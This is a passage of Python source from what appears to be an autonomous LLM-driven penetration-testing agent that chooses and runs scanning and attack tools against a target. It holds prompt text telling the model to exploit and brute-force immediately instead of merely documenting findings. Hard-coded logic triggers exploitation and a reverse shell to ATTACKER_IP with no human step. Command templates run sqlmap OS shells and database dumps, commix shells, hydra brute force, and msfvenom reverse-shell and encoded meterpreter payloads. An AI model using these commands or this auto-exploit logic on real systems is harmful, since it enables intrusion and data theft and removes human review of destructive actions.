                    continue
                raise
        raise Exception(f"API calls failed after {max_retries} attempts with exponential backoff")
    
    async def _get_next_action(self) -> Dict[str, Any]:
        """Ask AI to determine next action"""
        system_prompt = self._get_system_prompt()
        
        elapsed = (datetime.now() - self.start_time).total_seconds() / 60
        remaining_time = self.config.time_limit - elapsed
        
        user_prompt = f"""Current state of penetration test:

Target: {self.config.target}
Elapsed time: {elapsed:.1f} minutes
Remaining time: {remaining_time:.1f} minutes
Iteration: {self.iteration + 1}/{self.config.max_iterations}

{self._format_findings_for_ai()}

{self._format_actions_for_ai()}

Based on the current findings and the primary goal ({self.config.primary_goal.value}), what should be the next action?

‚ö†Ô∏è CRITICAL RULES FOR HIGH RISK MODE:
- If risk_tolerance=HIGH and found RCE/SQLi/Command Injection/File Upload ‚Üí IMMEDIATELY use exploit_vuln
- If risk_tolerance=HIGH and found open services (SSH/FTP/HTTP) ‚Üí IMMEDIATELY use bruteforce
- DO NOT just document vulnerabilities - ACTUALLY ATTEMPT EXPLOITATION when authorized!
- Goal=gain_shell_access + HIGH risk = MANDATORY to use exploit_vuln after finding any RCE

Respond with a JSON object only (no additional text)."""

        # üî• AUTO-EXPLOITATION: Check if we found exploitable vulns and should exploit immediately
        if self.config.risk_tolerance == RiskTolerance.HIGH and self.findings:
            # Check for CRITICAL exploitation opportunities
            critical_vulns = [f for f in self.findings if any(
                keyword in f.description.lower() 
                for keyword in ["rce", "command injection", "file upload", "sql injection", "sqli", "remote code"]
            ) and f.severity.lower() in ["critical", "high"]]
            
            # Check if we haven't exploited yet
            has_exploited = any(a.tool == "exploit_vuln" for a in self.actions)
            
            # üéØ INTELLIGENT DECISION: If critical vuln found + no exploitation yet ‚Üí EXPLOIT NOW!
            if critical_vulns and not has_exploited:
                print(f"\nüí• [AUTO-EXPLOIT] Found {len(critical_vulns)} CRITICAL vulnerabilities - HALTING ENUMERATION")
                print(f"[AUTO-EXPLOIT] Switching to IMMEDIATE EXPLOITATION MODE")
                for vuln in critical_vulns[:3]:
                    print(f"  ‚Ä¢ {vuln.severity.upper()}: {vuln.description[:80]}")
                
                return {
                    "reasoning": f"CRITICAL AUTO-EXPLOITATION: Discovered {len(critical_vulns)} exploitable vulnerabilities (RCE/SQLi/Upload). Immediately attempting exploitation rather than continuing enumeration. Time-sensitive opportunity.",
                    "next_action": "exploit_vuln",
                    "parameters": {"lhost": "ATTACKER_IP", "lport": 4444},
                    "risk_level": "high",
                    "expected_outcome": f"Shell access obtained via {critical_vulns[0].description}",
                    "exploitation_chain": f"Found {critical_vulns[0].category} vulnerability ‚Üí inject payload ‚Üí verify RCE ‚Üí establish shell",
                    "stop_testing": False,
                    "goal_progress": 80
                }

        # Use aggressive retry with exponential backoff for rate limits (ALL providers)
        async def query_ai():
            return await self.ai_provider.query(system_prompt, user_prompt, temperature=0.7)
        
        try:
            # 5 retries with 3s base delay = up to 48s max wait before fallback
            response = await self._retry_with_backoff(query_ai, max_retries=5, base_delay=3.0)
        except Exception as e:
            error_msg = str(e)
            print(f"[ERROR] AI query failed after retries: {error_msg}")
            
            # üî• INTELLIGENT FALLBACK: Attempt exploitation if vulnerabilities found
            # Check what we've discovered so far
            has_port_scan = any(f.tool == "port_scan" for f in self.findings)
            has_web_scan = any(f.tool in ["web_pentest", "nuclei"] for f in self.findings)
            has_nuclei_scan = sum(1 for f in self.findings if f.tool == "nuclei")
            
            # Find exploitable targets from our findings
            high_value_ports = []
            for f in self.findings:
                if f.tool == "port_scan" and f.severity.lower() in ["high", "critical"]:
                    # PostgreSQL, MySQL, SSH, FTP - ripe for brute force
                    if "5432" in f.description or "3306" in f.description or "22" in f.description or "21" in f.description:
                        high_value_ports.append(f)
            
            web_vulns = [f for f in self.findings if f.tool == "web_pentest" and f.severity.lower() in ["high", "critical", "medium"]]
            
            # üéØ EXPLOITATION FALLBACK: Try to exploit what we found
            if self.config.custom_instructions and "exploit" in self.config.custom_instructions.lower():
                print("  [üî• EXPLOITATION FALLBACK] AI unavailable but user requested exploitation - attempting automated exploit")
                
                # Prioritize exploitation based on what we found
                if web_vulns:
                    print(f"  [üî• EXPLOIT] Found {len(web_vulns)} web vulnerabilities - trying sqlmap")
                    return {
                        "reasoning": f"AI unavailable but user requested exploitation. Found web vulnerabilities: {web_vulns[0].description[:100]}. Attempting sqlmap.",
                        "next_action": "sqlmap",
                        "parameters": {
                            "url": f"http://{self.config.target}",
                            "action": "test"
                        },
                        "risk_level": "high",
                        "stop_testing": False
                    }
                elif high_value_ports:
                    print(f"  [üî• EXPLOIT] Found high-value service on port - trying hydra brute force")
                    port_num = "5432" if "5432" in high_value_ports[0].description else "3306" if "3306" in high_value_ports[0].description else "22"
                    service = "postgresql" if port_num == "5432" else "mysql" if port_num == "3306" else "ssh"
                    return {
                        "reasoning": f"AI unavailable but user requested exploitation. Found {service} on port {port_num}. Attempting credential brute force.",
                        "next_action": "hydra",
                        "parameters": {
                            "target": self.config.target,
                            "service": service
                        },
                        "risk_level": "high",
                        "stop_testing": False
                    }
            
            # INTELLIGENT FALLBACK - actually test vulnerabilities even without AI
            print("  [SMART FALLBACK] AI unavailable - executing intelligent vulnerability testing sequence")
            
            # Check what we've done
            has_run_crawler = any(a.tool == "crawler" for a in self.actions)
            has_run_fuzzer = any(a.tool == "fuzzer" for a in self.actions)
            has_run_api_test = any(a.tool == "api_test" for a in self.actions)
            has_run_ssl = any(a.tool == "ssl_analyze" for a in self.actions)
            
            # Priority queue of tools to run when AI is down
            fallback_tools = []
            
            # If user wants SQLi testing, run fuzzer and web_pentest
            if self.config.custom_instructions and "sqli" in self.config.custom_instructions.lower():
                if not has_run_fuzzer:
                    fallback_tools.append(("fuzzer", "SQL injection fuzzing on discovered endpoints", {}))
            
            # If we found web service but didn't test it
            if has_port_scan and not has_web_scan:
                fallback_tools.append(("web_pentest", "OWASP Top 10 vulnerability testing (SQLi, XSS, RCE, etc.)", {"tests": ["sqli", "xss", "rce", "command_injection", "ssrf"]}))
            
            # Crawler to discover endpoints
            if has_port_scan and not has_run_crawler:
                fallback_tools.append(("crawler", "Discovering web endpoints and parameters for testing", {}))
            
            # API testing
            if not has_run_api_test:
                fallback_tools.append(("api_test", "Testing API security (REST, GraphQL, JWT)", {}))
            
            # SSL analysis
            if not has_run_ssl:
                fallback_tools.append(("ssl_analyze", "SSL/TLS configuration security analysis", {}))
            
            # Nuclei as last resort (only once)
            if has_nuclei_scan < 1:
                fallback_tools.append(("nuclei", "CVE detection with 8900+ templates", {"severity": ["critical", "high", "medium"], "tags": ["cve", "owasp", "sqli", "xss", "rce"]}))
            
            # Return next tool from queue or stop if all done
            if fallback_tools:
                tool, reasoning, params = fallback_tools[0]
                print(f"  [SMART FALLBACK] Running {tool}: {reasoning}")
                return {
                    "reasoning": f"AI unavailable. SMART FALLBACK: {reasoning}",
                    "next_action": tool,
                    "parameters": params,
                    "risk_level": "medium",
                    "stop_testing": False
                }
            else:
                # All fallback tools exhausted
                print("  [COMPLETE] All fallback scans completed. Test complete.")
                return {
                    "reasoning": "AI unavailable but all critical vulnerability scans completed via smart fallback",
                    "next_action": "recon",
                    "parameters": {},
                    "risk_level": "low",
                    "stop_testing": True
                }
        
        # Validate response is not None
        if response is None:
            print("[ERROR] AI returned None response")
            return {
                "reasoning": "AI returned empty response, defaulting to reconnaissance",
                "next_action": "recon",
                "parameters": {"domain": self.config.target},
                "risk_level": "low",
                "stop_testing": True
            }
        
        # Extract JSON from response (handle markdown code blocks and empty responses)
        response = response.strip()
        if not response:
            # Empty response - default to reconnaissance
            return {
                "next_action": "recon",
                "parameters": {"domain": self.config.target},
                "reasoning": "Starting with basic reconnaissance"
            }
        
        if response.startswith("```"):
            lines = response.split("\n")
            response = "\n".join(lines[1:-1])
        
        try:
            return json.loads(response)
        except json.JSONDecodeError:
            # If JSON parsing fails, extract JSON-like content
            import re
            json_match = re.search(r'\{[\s\S]*\}', response)
            if json_match:
                return json.loads(json_match.group())
            # Fallback to recon
            return {
                "next_action": "recon",
                "parameters": {"domain": self.config.target},
                "reasoning": "AI response parsing failed, defaulting to reconnaissance"
            }
    
    async def _execute_action(self, action: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the action determined by AI"""
        tool = action["next_action"]
        params = action.get("parameters", {})
        
        # Record the action
        agent_action = AgentAction(
            timestamp=datetime.now().isoformat(),
            action_type="execute",
            tool=tool,
            parameters=params,
            reasoning=action["reasoning"],
            risk_level=action.get("risk_level", "medium")
        )
        self.actions.append(agent_action)
        
        try:
            if tool == "port_scan":
                result = await self._run_port_scan(params)
            elif tool == "syn_scan":
                result = await self._run_syn_scan(params)
            elif tool == "udp_scan":
                result = await self._run_udp_scan(params)
            elif tool == "advanced_scan":
                result = await self._run_advanced_scan(params)
            elif tool == "dirbuster":
                result = await self._run_dirbuster(params)
            elif tool == "crawler":
                result = await self._run_crawler(params)
            elif tool == "fuzzer":
                result = await self._run_fuzzer(params)
            elif tool == "bruteforce":
                result = await self._run_bruteforce(params)
            elif tool == "nuclei":
                result = await self._run_nuclei(params)
            elif tool == "cloud_audit":
                result = await self._run_cloud_audit(params)
            elif tool == "k8s_audit":
                result = await self._run_k8s_audit(params)
            elif tool == "container_audit":
                result = await self._run_container_audit(params)
            elif tool == "exploit_vuln":
                result = await self._run_exploit(params)
            elif tool == "ssl_analyze":
                result = await self._run_ssl_analyze(params)
            elif tool == "os_fingerprint":
                result = await self._run_os_fingerprint(params)
            elif tool == "web_pentest":
                result = await self._run_web_pentest(params)
            elif tool == "api_test":
                result = await self._run_api_test(params)
            elif tool == "takeover_scan":
                result = await self._run_takeover_scan(params)
            elif tool == "tech_detect":
                result = await self._run_tech_detect(params)
            elif tool == "recon":
                result = await self._run_recon(params)
            elif tool == "payload_generate":
                result = await self._run_payload_generate(params)
            elif tool == "execute_command":
                result = await self._run_execute_command(params)
            elif tool == "nmap":
                result = await self._run_nmap(params)
            elif tool == "sqlmap":
                result = await self._run_sqlmap(params)
            elif tool == "harvester" or tool == "theHarvester":
                result = await self._run_harvester(params)
            elif tool == "hydra":
                result = await self._run_hydra(params)
            elif tool == "nuclei":
                result = await self._run_nuclei(params)
            elif tool == "commix":
                result = await self._run_commix(params)
            elif tool == "msfvenom":
                result = await self._run_msfvenom(params)
            elif tool == "gobuster":
                result = await self._run_gobuster(params)
            elif tool == "nikto":
                result = await self._run_nikto(params)
            elif tool == "service_enum":
                result = await self._run_service_enumeration(params)
            else:
                result = {"error": f"Unknown tool: {tool}"}
            
            return result
        except httpx.HTTPError as e:
            return {"error": f"HTTP error executing {tool}: {str(e)}"}
        except asyncio.TimeoutError:
            return {"error": f"Timeout executing {tool}"}
        except ValueError as e:
            return {"error": f"Invalid parameters for {tool}: {str(e)}"}
        except Exception as e:
            return {"error": f"Error executing {tool}: {str(e)}"}
    
    # Helper functions for external tool invocation
    async def _run_external_tool(self, tool_name: str, command: str, platform: str = "linux", background: bool = False) -> Dict[str, Any]:
        """Helper to run external tools via execute_command with error handling"""
        # Check if tool is installed
        check_cmd = f"which {tool_name} 2>/dev/null || echo 'NOT_FOUND'"
        check_result = await self._run_execute_command({
            "cmd": check_cmd,
            "platform": platform,
            "timeout": 5
        })
        
        if "NOT_FOUND" in check_result.get("stdout", ""):
            return {
                "error": f"{tool_name} not installed",
                "suggestion": f"Install {tool_name} or use built-in Scorpion tools",
                "tool": tool_name
            }
        
        # Run the actual tool
        return await self._run_execute_command({
            "cmd": command,
            "platform": platform,
            "background": background,
            "timeout": 120  # External tools may take longer
        })
    
    async def _run_nmap(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run nmap with specified parameters"""
        target = params.get("target", self.config.target)
        scan_type = params.get("type", "default")  # default, stealth, vuln, all-ports
        
        nmap_commands = {
            "default": f"nmap -sV -sC {target} -oN nmap_default.txt",
            "stealth": f"nmap -sS -T2 {target} -oN nmap_stealth.txt",
            "vuln": f"nmap --script vuln {target} -oN nmap_vuln.txt",
            "all-ports": f"nmap -p- {target} -oN nmap_all_ports.txt",
            "udp": f"nmap -sU --top-ports 100 {target} -oN nmap_udp.txt",
        }
        
        cmd = nmap_commands.get(scan_type, nmap_commands["default"])
        return await self._run_external_tool("nmap", cmd, "linux")
    
    async def _run_sqlmap(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run sqlmap for SQL injection testing"""
        url = params.get("url", f"http://{self.config.target}")
        action = params.get("action", "test")  # test, dump, shell
        
        sqlmap_commands = {
            "test": f"sqlmap -u '{url}' --batch --dbs --threads=5",
            "dump": f"sqlmap -u '{url}' --batch --dump --threads=5",
            "shell": f"sqlmap -u '{url}' --batch --os-shell",
            "tamper": f"sqlmap -u '{url}' --batch --tamper=space2comment,between --dbs",
        }
        
        cmd = sqlmap_commands.get(action, sqlmap_commands["test"])
        return await self._run_external_tool("sqlmap", cmd, "linux", background=(action=="shell"))
    
    async def _run_harvester(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run theHarvester for OSINT"""
        domain = params.get("domain", self.config.target)
        source = params.get("source", "all")  # all, google, bing, linkedin
        
        cmd = f"theHarvester -d {domain} -b {source} -f harvester_{domain}"
        return await self._run_external_tool("theHarvester", cmd, "linux")
    
    async def _run_hydra(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run hydra for password brute-forcing"""
        target = params.get("target", self.config.target)
        service = params.get("service", "ssh")  # ssh, ftp, http-post-form
        userlist = params.get("userlist", "/usr/share/wordlists/metasploit/unix_users.txt")
        passlist = params.get("passlist", "/usr/share/wordlists/rockyou.txt")
        
        cmd = f"hydra -L {userlist} -P {passlist} {service}://{target}"
        return await self._run_external_tool("hydra", cmd, "linux")
    
    async def _run_nuclei(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run nuclei vulnerability scanner"""
        target = params.get("target", f"http://{self.config.target}")
        severity = params.get("severity", "critical,high")  # critical, high, medium, low
        templates = params.get("templates", "")  # specific template path or empty for all
        
        if templates:
            cmd = f"nuclei -u {target} -t {templates} -silent"
        else:
            cmd = f"nuclei -u {target} -severity {severity} -silent"
        
        return await self._run_external_tool("nuclei", cmd, "linux")
    
    async def _run_commix(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run commix for command injection exploitation"""
        url = params.get("url", f"http://{self.config.target}")
        action = params.get("action", "test")  # test, exploit, shell
        
        commix_commands = {
            "test": f"commix --url='{url}' --batch --tech=classic,eval-based",
            "exploit": f"commix --url='{url}' --batch --all",
            "shell": f"commix --url='{url}' --batch --os-shell",
        }
        
        cmd = commix_commands.get(action, commix_commands["test"])
        return await self._run_external_tool("commix", cmd, "linux", background=(action=="shell"))
    
    async def _run_msfvenom(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run msfvenom to generate payloads"""
        payload_type = params.get("type", "linux")  # linux, windows, php, jsp
        lhost = params.get("lhost", "ATTACKER_IP")
        lport = params.get("lport", "4444")
        output = params.get("output", "payload")
        
        msfvenom_payloads = {
            "linux": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}.elf",
            "windows": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}.exe",
            "php": f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {output}.php",
            "jsp": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output}.jsp",
            "encoded": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 10 -f exe -o {output}.exe",
        }
        
        cmd = msfvenom_payloads.get(payload_type, msfvenom_payloads["linux"])
        return await self._run_external_tool("msfvenom", cmd, "linux")
    
    async def _run_gobuster(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run gobuster for directory/file brute-forcing"""
        target = params.get("target", f"http://{self.config.target}")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        mode = params.get("mode", "dir")  # dir, dns, vhost
        
        if mode == "dir":
            cmd = f"gobuster dir -u {target} -w {wordlist} -q"
        elif mode == "dns":
            cmd = f"gobuster dns -d {self.config.target} -w {wordlist} -q"
        elif mode == "vhost":
            cmd = f"gobuster vhost -u {target} -w {wordlist} -q"
        else:
            cmd = f"gobuster dir -u {target} -w {wordlist} -q"
        
        return await self._run_external_tool("gobuster", cmd, "linux")
    
    async def _run_nikto(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run nikto web vulnerability scanner"""
        target = params.get("target", f"http://{self.config.target}")
        output = params.get("output", "nikto_results.txt")
        
        cmd = f"nikto -h {target} -o {output}"
        return await self._run_external_tool("nikto", cmd, "linux")
    
    async def _run_port_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute intelligent port scan - FULL RANGE or targeted based on risk tolerance"""
        # Parse ports from params if provided
        ports = params.get("ports", None) if params else None
        
        # Parse ports if string (AI might send "80,8080" instead of [80,8080])
        if isinstance(ports, str):
            # Handle special keywords
            if ports.lower() in ["all", "full", "full-range", "1-65535"]:
                ports = "full"
            else:
                try:
                    # Handle comma-separated string: "80,8080,443"
                    ports = [int(p.strip()) for p in ports.split(',') if p.strip().isdigit()]
                    print(f"  [INFO] Parsed port string to list: {ports}")
                except:
                    print(f"  [WARNING] Could not parse port string: {ports}. Using intelligent defaults.")
                    ports = None
        
        # INTELLIGENT PORT SELECTION - based on risk tolerance (NOT stealth!)
        if not ports or (isinstance(ports, list) and len(ports) == 0):
            if self.config.risk_tolerance == RiskTolerance.HIGH:
                # HIGH RISK = FULL COMPREHENSIVE SCAN
                # Top 1000 most common ports (fast but thorough)
                print(f"  [AGGRESSIVE] HIGH risk mode - scanning TOP 1000 PORTS for comprehensive discovery")
                ports = list(range(1, 1001))  # Ports 1-1000 (covers 99% of services)
                print(f"  [INFO] This covers web (80, 443, 8000-9000), databases (3306, 5432, etc.), custom services")
            elif self.config.risk_tolerance == RiskTolerance.MEDIUM:
                # MEDIUM RISK = COMMON + EXTENDED PORTS
                print(f"  [BALANCED] MEDIUM risk - scanning TOP 200 PORTS (common + extended)")
                # Common + web alternatives + databases + custom ports
                ports = (
                    list(range(1, 101)) +      # 1-100 (very common)
                    list(range(135, 146)) +    # Windows services
                    list(range(443, 446)) +    # HTTPS range
                    list(range(3000, 3010)) +  # Development servers
                    list(range(5000, 5010)) +  # Flask, custom apps
                    list(range(8000, 8010)) +  # Alt HTTP
                    list(range(8080, 8090)) +  # Alt HTTP/proxy
                    list(range(9000, 9010)) +  # Alt services
                    [1433, 1521, 3306, 3389, 5432, 5900, 6379, 8443, 8888, 9090, 9200, 27017, 50000]
                )
                ports = sorted(list(set(ports)))  # Remove duplicates, sort
            else:
                # LOW RISK = STANDARD COMMON PORTS
                print(f"  [STANDARD] LOW risk - scanning 100 most common ports")
                ports = list(range(1, 101))  # 1-100 covers most common services
            
            print(f"  [INFO] Scanning {len(ports)} ports based on risk_tolerance={self.config.risk_tolerance.value}")
        elif ports == "full":
            # FULL RANGE SCAN (1-65535) - USE WITH CAUTION!
            print(f"  [WARNING] FULL PORT RANGE scan requested (1-65535) - this may take 10-30 minutes!")
            print(f"  [INFO] Scanning ALL 65535 ports to find services on ANY custom port")
            ports = list(range(1, 65536))  # All ports
        elif isinstance(ports, list):
            print(f"  [CUSTOM] Scanning {len(ports)} user-specified ports")
        else:
            # Invalid format - use intelligent defaults
            print(f"  [WARNING] Invalid port format: {type(ports)}. Using standard common ports.")
            ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 8080, 8443]
        
        concurrency = params.get("concurrency", 100 if self.config.stealth_level == StealthLevel.LOW else 20)
        scan_type = params.get("scan_type", "tcp").lower()
        
        # Validate scan type
        valid_scan_types = ["tcp", "udp", "fin", "xmas", "null", "ack"]
        if scan_type not in valid_scan_types:
            return {
                "error": f"Invalid scan type '{scan_type}'. Valid types: {', '.join(valid_scan_types)}",
                "fallback": "tcp"
            }
        
        result_list = await async_port_scan(
            self.target_host,
            ports=ports,
            concurrency=concurrency
        )
        
        # Convert to findings with intelligent exploitation recommendations
        open_ports = [r for r in result_list if r.get("state") == "open"]
        high_value_services = []
        
        if open_ports:
            for port_info in open_ports:
                port = port_info['port']
                service = port_info.get('service', 'unknown')
                
                # Intelligent severity and exploitation potential based on service
                severity = "info"
                exploitation_potential = "low"
                recommended_action = "Further enumerate service"
                
                # High-value targets
                if port in [21, 22, 23, 3389, 5900]:  # FTP, SSH, Telnet, RDP, VNC
                    severity = "medium"
                    exploitation_potential = "medium"
                    recommended_action = f"Attempt bruteforce attack on {service}. Common usernames: admin, root, administrator"
                    high_value_services.append(f"{service}:{port}")
                elif port in [445, 139]:  # SMB
                    severity = "high"
                    exploitation_potential = "high"
                    recommended_action = "Check for EternalBlue (MS17-010), SMB null sessions, and share enumeration"
                    high_value_services.append(f"{service}:{port}")
                elif port in [3306, 5432, 1433, 1521, 27017]:  # Databases
                    severity = "high"
                    exploitation_potential = "high"
                    recommended_action = f"Attempt {service} bruteforce. Check for default credentials and SQL injection"
                    high_value_services.append(f"{service}:{port}")
                elif port in [80, 443, 8080, 8443]:  # HTTP/HTTPS
                    severity = "medium"
                    exploitation_potential = "medium"
                    recommended_action = "Run web application scan (SQLi, XSS, RCE). Check for admin panels, directory traversal"
                    high_value_services.append(f"{service}:{port}")
                elif port in [6379, 11211]:  # Redis, Memcached
                    severity = "high"
                    exploitation_potential = "critical"
                    recommended_action = "Check for unauthenticated access. Redis can lead to RCE via module loading"
                    high_value_services.append(f"{service}:{port}")
                elif port in [9200, 9300]:  # Elasticsearch
                    severity = "high"
                    exploitation_potential = "high"
                    recommended_action = "Check for unauthenticated API access. Elasticsearch often exposes sensitive data"
                    high_value_services.append(f"{service}:{port}")
                
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="port_scan",
                    severity=severity,
                    category="reconnaissance",
                    description=f"Open port {port} - {service}",
                    details=port_info,
                    exploitation_potential=exploitation_potential,
                    recommended_action=recommended_action
                )
                self.findings.append(finding)
        
        return {
            "open_ports": len(open_ports),
            "details": open_ports,
            "high_value_services": high_value_services,
            "exploitation_suggestions": [f.recommended_action for f in self.findings if f.exploitation_potential in ["high", "critical"]][-5:]
        }
    
    async def _run_syn_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute SYN scan"""
        ports = params.get("ports", list(range(1, 1001)))
        
        try:
            result_list = await async_syn_scan(
                self.config.target,
                ports=ports
            )
            
            open_ports = [r for r in result_list if r.get("state") == "open"]
            if open_ports:
                for port_info in open_ports:
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="syn_scan",
                        severity="info",
                        category="reconnaissance",
                        description=f"Open port {port_info.get('port')} (SYN scan)",
                        details=port_info,
                        exploitation_potential="low",
                        recommended_action="Version detection"
                    )
                    self.findings.append(finding)
            
            return {"open_ports": len(open_ports), "details": open_ports}
        except Exception as e:
            return {"error": f"SYN scan requires admin/root privileges: {e}"}
    
    async def _run_ssl_analyze(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze SSL/TLS"""
        port = params.get("port", 443)
        
        result = await analyze_ssl(self.config.target, port=port)
        
        # Check for vulnerabilities
        if result.get("vulnerabilities"):
            for vuln in result["vulnerabilities"]:
                severity = "high" if "critical" in vuln.lower() else "medium"
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="ssl_analyze",
                    severity=severity,
                    category="ssl_tls",
                    description=vuln,
                    details=result,
                    exploitation_potential="medium",
                    recommended_action="Update SSL/TLS configuration"
                )
                self.findings.append(finding)
        
        return result
    
    async def _run_os_fingerprint(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run OS fingerprinting"""
        fingerprinter = OSFingerprinter()
        # Use comprehensive fingerprint with common ports
        open_ports = params.get("ports", [80, 443, 22, 21, 25])
        result = await fingerprinter.comprehensive_fingerprint(self.config.target, open_ports)
        
        if result.get("os_match"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="os_fingerprint",
                severity="info",
                category="reconnaissance",
                description=f"OS detected: {result['os_match']} (confidence: {result.get('confidence', 0)}%)",
                details=result,
                exploitation_potential="low",
                recommended_action="Tailor exploits to OS"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_web_pentest(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        AUTONOMOUS web pentest - discovers and tests ALL pages automatically
        1. Collects pages from dirbuster/crawler
        2. Tests EVERY discovered endpoint
        3. Exploits found vulnerabilities (HIGH risk mode)
        """
        # STEP 1: Collect ALL discovered pages from reconnaissance
        discovered_pages = set()
        base_url = None
        
        for f in self.findings:
            # Get pages from dirbuster
            if f.tool == "dirbuster" and isinstance(f.details, dict):
                path = f.details.get("path", "")
                status = f.details.get("status", 0)
                # ‚úÖ FIX: Test ALL successful pages with dynamic extensions (not just those with ?)
                if 200 <= status < 400 and path:
                    # Test pages with existing parameters OR dynamic extensions
                    if "?" in path or path.endswith((".php", ".asp", ".aspx", ".jsp", ".do")):
                        discovered_pages.add(path)
                        # üéØ SMART: If page has no params but is .php/.asp, add common SQLi params
                        if "?" not in path and path.endswith((".php", ".asp", ".aspx", ".jsp")):
                            for param in ["id", "cat", "artist", "product", "user", "page", "item"]:
                                discovered_pages.add(f"{path}?{param}=1")
            # Get pages from crawler
            elif f.tool == "crawler" and isinstance(f.details, dict):
                url = f.details.get("url", "")
                if url:
                    # Test pages with parameters OR dynamic extensions
                    if "?" in url or url.endswith((".php", ".asp", ".aspx", ".jsp")):
                        discovered_pages.add(url)
                        # Add common SQLi params if no existing params
                        if "?" not in url and url.endswith((".php", ".asp", ".aspx", ".jsp")):
                            for param in ["id", "cat", "artist", "product"]:
                                discovered_pages.add(f"{url}?{param}=1")
        
        print(f"  [AUTO-DISCOVERY] Found {len(discovered_pages)} dynamic pages from reconnaissance")
        
        # STEP 2: Build base URL from open ports
        test_urls = []
        
        if params.get("url"):
            test_urls = [params["url"]]
        else:
            # DYNAMIC: Extract ALL HTTP/HTTPS ports from REAL port scan results
            http_ports = []
            https_ports = []
            
            for f in self.findings:
                if f.tool in ["port_scan", "syn_scan", "advanced_scan", "service_enum"]:
                    port = None
                    service_info = ""
                    
                    # Extract port number from findings
                    if isinstance(f.details, dict):
                        port = f.details.get("port")
                        service_info = str(f.details.get("service", "")).lower()
                        service_info += " " + str(f.details.get("reason", "")).lower()
                    
                    # Also check description for port info
                    desc_lower = f.description.lower()
                    service_info += " " + desc_lower
                    
                    # If no port in details, try extracting from description
                    if not port and "port" in desc_lower:
                        import re
                        port_match = re.search(r'\bport\s+(\d+)\b', desc_lower)
                        if port_match:
                            port = int(port_match.group(1))
                    
                    if port:
                        # Skip if already processed (prevent duplicate discoveries)
                        if port in http_ports or port in https_ports:
                            continue
                        
                        # Identify HTTP/HTTPS services by port AND service detection
                        is_https = (
                            port == 443 or 
                            "https" in service_info or 
                            "ssl" in service_info or 
                            "tls" in service_info
                        )
                        
                        is_http = (
                            "http" in service_info or 
                            "web" in service_info or
                            port in [80, 8000, 8008, 8080, 8081, 8888, 9000, 9090, 3000, 5000]
                        )
                        
                        # Priority: HTTPS first (more specific), then HTTP
                        if is_https:
                            https_ports.append(port)
                            print(f"  [DISCOVERED] HTTPS service on port {port}")
                        elif is_http:
                            http_ports.append(port)
                            print(f"  [DISCOVERED] HTTP service on port {port}")
                        # If it's an open port but not identified as web service, skip it
            
            # Build URLs for ALL discovered HTTP/HTTPS ports (NO HARDCODING!)
            # Priority: HTTP ports first (usually less secured), then HTTPS
            for port in sorted(http_ports):
                test_urls.append(f"http://{self.target_host}:{port}")
                if not base_url:
                    base_url = f"http://{self.target_host}:{port}"
            
            for port in sorted(https_ports):
                test_urls.append(f"https://{self.target_host}:{port}")
                if not base_url:
                    base_url = f"https://{self.target_host}:{port}"
            
            # Fallback ONLY if port scan found nothing (external sites, DNS-only targets)
            if not test_urls:
                print(f"  [FALLBACK] No HTTP/HTTPS ports discovered, trying common defaults...")
                test_urls = [
                    f"http://{self.target_host}:80",
                    f"https://{self.target_host}:443",
                    f"http://{self.target_host}:8080"
                ]
                base_url = test_urls[0]
            else:
                print(f"  [DYNAMIC] Testing {len(test_urls)} discovered web services (NO HARDCODING)")
        
        all_vulnerabilities = []
        successful_url = None
        
        # STEP 3: Test ALL discovered pages (AUTONOMOUS)
        pages_to_test = list(discovered_pages) if discovered_pages else []
        if pages_to_test:
            print(f"  [AUTONOMOUS] Testing {len(pages_to_test)} discovered pages for vulnerabilities...")
            for page in pages_to_test[:20]:  # Limit to top 20 to prevent timeout
                # Build full URL
                if page.startswith("http"):
                    page_url = page
                else:
                    page_url = f"{base_url or test_urls[0]}{page if page.startswith('/') else '/' + page}"
                
                print(f"  [TESTING] {page_url[:80]}...")
                try:
                    tester = AdvancedWebTester(
                        target=page_url,
                        concurrency=10 if self.config.stealth_level == StealthLevel.HIGH else 50,
                        timeout=5.0
                    )
                    
                    vulnerabilities = await asyncio.wait_for(
                        tester.run_full_scan(),
                        timeout=120.0  # 120s for aggressive scanning
                    )
                    
                    if vulnerabilities:
                        print(f"    [VULN!] Found {len(vulnerabilities)} vulnerabilities!")
                        all_vulnerabilities.extend(vulnerabilities)
                        successful_url = page_url
                
                except asyncio.TimeoutError:
                    print(f"    [SKIP] Timeout, moving to next page...")
                    continue
                except Exception as e:
                    print(f"    [SKIP] Error: {str(e)[:50]}")
                    continue
        
        # STEP 4: Fallback - test base URL if no pages discovered
        if not pages_to_test:
            print(f"  [FALLBACK] No pages discovered, testing base URL...")
        
        # Try each base URL until one works
        for target_url in test_urls:
            if successful_url:  # Already found vulns on discovered pages
                break
            
            print(f"  [WEB PENTEST] Testing base {target_url}...")
            
            try:
                tester = AdvancedWebTester(
                    target=target_url,
